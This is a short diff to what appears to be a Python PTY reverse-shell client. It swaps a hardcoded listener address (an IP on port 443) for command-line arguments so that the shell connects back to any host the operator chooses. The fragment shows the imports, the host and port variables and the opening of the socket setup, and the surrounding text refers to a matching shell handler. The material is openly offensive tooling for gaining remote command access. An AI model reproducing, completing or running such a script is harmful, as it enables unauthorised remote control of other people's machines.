@@ -13,9 +13,10 @@ Or use the included tcp_pty_shell_handler.py
 import os
 import pty
 import socket
+import sys
 
-lhost = "37.139.27.187" # XXX: CHANGEME
-lport = 443 # XXX: CHANGEME
+lhost = sys.argv[1] # XXX: CHANGEME
+lport = sys.argv[2] # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
